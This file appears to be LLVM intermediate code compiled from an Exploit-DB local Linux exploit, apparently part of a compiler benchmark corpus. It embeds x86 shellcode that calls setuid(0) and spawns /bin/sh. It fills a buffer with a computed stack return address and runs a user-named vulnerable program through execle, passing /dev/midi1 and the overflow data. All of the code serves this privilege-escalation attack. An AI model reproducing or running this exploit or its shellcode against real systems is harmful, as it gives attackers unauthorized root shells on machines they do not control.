; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_28288.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_28288.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@__const.main.shellcode = private unnamed_addr constant [31 x i8] c"j\17X1\DB\CD\80j\0BX\99Rh//shh/bin\89\E3RS\89\E1\CD\80\00", align 16
@stderr = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [25 x i8] c"Use : %s <path_to_vuln>\0A\00", align 1
@BUFSIZE = common dso_local global i32 0, align 4
@ALIGNMENT = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [11 x i8] c"/dev/midi1\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca [31 x i8], align 16
  %7 = alloca [2 x i8*], align 16
  %8 = alloca i8*, align 8
  %9 = alloca i64, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32*, align 8
  %12 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %13 = bitcast [31 x i8]* %6 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 16 %13, i8* align 16 getelementptr inbounds ([31 x i8], [31 x i8]* @__const.main.shellcode, i32 0, i32 0), i64 31, i1 false)
  %14 = load i32, i32* %4, align 4
  %15 = icmp slt i32 %14, 2
  br i1 %15, label %16, label %22

16:                                               ; preds = %2
  %17 = load i32, i32* @stderr, align 4
  %18 = load i8**, i8*** %5, align 8
  %19 = getelementptr inbounds i8*, i8** %18, i64 0
  %20 = load i8*, i8** %19, align 8
  %21 = call i32 @fprintf(i32 %17, i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str, i64 0, i64 0), i8* %20)
  store i32 0, i32* %3, align 4
  br label %61

22:                                               ; preds = %2
  %23 = getelementptr inbounds [2 x i8*], [2 x i8*]* %7, i64 0, i64 0
  %24 = getelementptr inbounds [31 x i8], [31 x i8]* %6, i64 0, i64 0
  store i8* %24, i8** %23, align 8
  %25 = getelementptr inbounds i8*, i8** %23, i64 1
  store i8* null, i8** %25, align 8
  %26 = load i32, i32* @BUFSIZE, align 4
  %27 = zext i32 %26 to i64
  %28 = call i8* @llvm.stacksave()
  store i8* %28, i8** %8, align 8
  %29 = alloca i8, i64 %27, align 16
  store i64 %27, i64* %9, align 8
  %30 = load i32, i32* @ALIGNMENT, align 4
  %31 = sext i32 %30 to i64
  %32 = getelementptr inbounds i8, i8* %29, i64 %31
  %33 = bitcast i8* %32 to i32*
  store i32* %33, i32** %11, align 8
  %34 = getelementptr inbounds [31 x i8], [31 x i8]* %6, i64 0, i64 0
  %35 = call i32 @strlen(i8* %34)
  %36 = sub i32 -1073741830, %35
  %37 = load i8**, i8*** %5, align 8
  %38 = getelementptr inbounds i8*, i8** %37, i64 1
  %39 = load i8*, i8** %38, align 8
  %40 = call i32 @strlen(i8* %39)
  %41 = sub i32 %36, %40
  store i32 %41, i32* %12, align 4
  store i32 0, i32* %10, align 4
  br label %42

42:                                               ; preds = %51, %22
  %43 = load i32, i32* %10, align 4
  %44 = load i32, i32* @BUFSIZE, align 4
  %45 = sub nsw i32 %44, 4
  %46 = icmp slt i32 %43, %45
  br i1 %46, label %47, label %54

47:                                               ; preds = %42
  %48 = load i32, i32* %12, align 4
  %49 = load i32*, i32** %11, align 8
  %50 = getelementptr inbounds i32, i32* %49, i32 1
  store i32* %50, i32** %11, align 8
  store i32 %48, i32* %49, align 4
  br label %51

51:                                               ; preds = %47
  %52 = load i32, i32* %10, align 4
  %53 = add nsw i32 %52, 4
  store i32 %53, i32* %10, align 4
  br label %42

54:                                               ; preds = %42
  %55 = load i8**, i8*** %5, align 8
  %56 = getelementptr inbounds i8*, i8** %55, i64 1
  %57 = load i8*, i8** %56, align 8
  %58 = getelementptr inbounds [2 x i8*], [2 x i8*]* %7, i64 0, i64 0
  %59 = call i32 @execle(i8* %57, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.1, i64 0, i64 0), i8* %29, i32* null, i8** %58)
  %60 = load i8*, i8** %8, align 8
  call void @llvm.stackrestore(i8* %60)
  br label %61

61:                                               ; preds = %54, %16
  %62 = load i32, i32* %3, align 4
  ret i32 %62
}

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #1

declare dso_local i32 @fprintf(i32, i8*, i8*) #2

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #3

declare dso_local i32 @strlen(i8*) #2

declare dso_local i32 @execle(i8*, i8*, i8*, i32*, i8**) #2

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #3

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { argmemonly nounwind willreturn }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { nounwind }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
